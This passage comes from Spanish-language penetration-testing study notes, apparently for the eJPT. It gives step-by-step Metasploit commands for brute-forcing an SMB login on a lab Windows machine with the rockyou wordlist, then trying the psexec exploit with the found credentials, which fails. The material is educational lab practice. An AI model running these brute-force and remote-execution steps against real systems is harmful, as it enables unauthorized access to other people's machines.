1. Utilizamos un modulo de **Metasploit** que sirve para iniciar sesión y hacer ataques de **Fuerza Bruta** al protocolo **SMB**:
```
use auxiliary/scanner/smb/smb_login
```
![Hacking al Protocolo SMB 9](ejpt/img/hacking-al-protocolo-smb-9.png)

2. Vemos la configuración del modulo:
```
show options
```
![Hacking al Protocolo SMB 10](ejpt/img/hacking-al-protocolo-smb-10.png)

3. Configuramos el **RHOSTS** (IP de la victima **Windows**):
```
set RHOSTS 192.168.8.132
```
![Hacking al Protocolo SMB 11](ejpt/img/hacking-al-protocolo-smb-11.png)

4. Quitamos el **Verbose** para que el ataque de **Fuerza Bruta** vaya mas rápido:
```
set VERBOSE false
```
![Hacking al Protocolo SMB 12](ejpt/img/hacking-al-protocolo-smb-12.png)

5. Introducimos el usuario que conocemos:
```
set SMBUSER mario
```
![Hacking al Protocolo SMB 13](ejpt/img/hacking-al-protocolo-smb-13.png)

6. Introducimos el diccionario con el que haremos **Fuerza Bruta**:
```
set PASS_FILE /usr/share/wordlists/rockyou.txt
```
![Hacking al Protocolo SMB 14](ejpt/img/hacking-al-protocolo-smb-14.png)

7. Vemos como ha quedado la configuración del modulo:
```
show options
```
![Hacking al Protocolo SMB 15](ejpt/img/hacking-al-protocolo-smb-15.png)

8. Iniciamos el modulo para empezar el ataque de **Fuerza Bruta**:
```
run
```
![Hacking al Protocolo SMB 16](ejpt/img/hacking-al-protocolo-smb-16.png)

9. Intentamos iniciar sesión mediante **psexec**:
- Siempre hay que probar a iniciar sesión mediante **psexec** una vez tengamos usuario y contraseña porque esto significa que yo puedo controlar de forma remota la maquina victima.
- Puede ser que no este habilitado **psexec** pero hay que probar siempre.

9. Utilizamos un **exploit** de **Metasploit** de **psexec**:
```
use exploit/windows/smb/psexec
```
![Hacking al Protocolo SMB 17](ejpt/img/hacking-al-protocolo-smb-17.png)

10. Vemos la configuración del **exploit**:
```
show options
```
![Hacking al Protocolo SMB 18](ejpt/img/hacking-al-protocolo-smb-18.png)

11. Configuramos el **RHOSTS** (IP de la victima **Windows**):
```
set RHOSTS 192.168.8.132
```
![Hacking al Protocolo SMB 22](ejpt/img/hacking-al-protocolo-smb-22.png)

12. Configuramos el usuario que utilizamos para ver los recursos compartidos por **SMB**:
```
set SMBUSER mario
```
![Hacking al Protocolo SMB 21](ejpt/img/hacking-al-protocolo-smb-21.png)

13. Configuramos la contraseña del usuario **mario**:
```
set SMBPASS 123123
```
![Hacking al Protocolo SMB 20](ejpt/img/hacking-al-protocolo-smb-20.png)

14. Iniciamos el **exploit**:
```
run
```
![Hacking al Protocolo SMB 19](ejpt/img/hacking-al-protocolo-smb-19.png)
- **En este caso no funcionó porque *psexec* no esta habilitado en la maquina victima *Windows*.**